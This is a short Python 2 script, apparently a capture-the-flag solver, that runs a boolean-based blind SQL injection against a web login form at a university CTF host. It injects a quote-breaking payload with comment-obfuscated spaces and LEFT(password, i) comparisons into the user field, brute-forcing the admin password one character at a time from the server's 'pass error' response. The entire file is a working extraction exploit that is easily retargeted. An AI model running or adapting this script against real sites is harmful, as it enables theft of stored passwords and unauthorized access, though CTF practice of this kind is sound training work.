#coding:utf-8
import requests
import string
import json
import urllib
lens=0
i = 1
right = 'pass error'
error = 'no such user'
dic = string.digits + string.letters + "!@#$%^&*()_+{}-="
url = r'http://ctf.xjnu.edu.cn:9900/web50/'
s = requests.session()
result =""
for i in range(1,50):
    print("the"+str(i)+":")
    for c in dic:
        payload = "1'/**/or/**/left(password,"+str(i)+")='"+str(result)+str(c)
        # /**/or/**/left(password,1)="+str(5)+"
        print payload
        data = {'pwd':"admin",'user':payload}
        # print data
        r = s.post(url,data=data).content
        # print r
        if right in r:
            result+=c
            break       
    print(result)
#截取字符串常用函数：mid(),substr(),left() 
#     if error in r:
#         lens = i
#         break
#     i+=1
#     pass
# print("[+]length(table): %d" %(lens))